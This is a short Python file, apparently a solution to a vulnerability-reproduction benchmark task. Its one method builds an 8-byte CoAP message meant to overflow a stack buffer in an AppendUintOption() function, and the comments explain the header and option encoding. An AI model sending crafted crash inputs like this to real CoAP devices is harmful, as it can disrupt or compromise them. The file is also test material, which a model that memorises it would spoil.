class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a stack buffer overflow in the AppendUintOption()
        function. This can be triggered by forcing the serialization of a CoAP
        option into a temporary stack buffer that is too small.

        The size of a serialized CoAP option depends on its delta and value length.
        A large option delta (>= 269) requires a 2-byte extended delta field,
        increasing the total serialized size.

        The ground-truth PoC uses multiple options with a delta of 269. The final
        option has a value of 1 (1-byte length), while previous ones have a value
        of 0 (0-byte length). This suggests that a serialized option of size 3
        (1-byte header + 2-byte ext_delta + 0-byte value) does not crash, but one
        of size 4 (1-byte header + 2-byte ext_delta + 1-byte value) does. This
        implies a temporary stack buffer of size 3.

        This PoC constructs a minimal CoAP message with a single option designed
        to have a serialized length of 4 bytes, causing a 1-byte overflow on a
        3-byte buffer.
        """

        # CoAP Header (4 bytes):
        # - Version: 1, Type: Non-confirmable (1), Token Length: 0 -> 0x50
        # - Code: GET (1) -> 0x01
        # - Message ID: 0x1234 (arbitrary)
        header = b'\x50\x01\x12\x34'

        # CoAP Option (4 bytes):
        # - To achieve a delta of 269, we use option number 269 (assuming no
        #   previous options, the delta is calculated from 0).
        # - To achieve a value length of 1, we use an integer value of 1.
        # - Encoding:
        #   - Delta 269 -> Delta nibble 14 (0xE), Extended Delta 0x0000
        #   - Length 1  -> Length nibble 1 (0x1)
        #   - Option Header Byte: 0xE1
        #   - Value: 0x01
        #   - Full serialized option: 0xE1 (header) + 0x0000 (ext_delta) + 0x01 (value)
        option = b'\xe1\x00\x00\x01'

        poc = header + option
        return poc
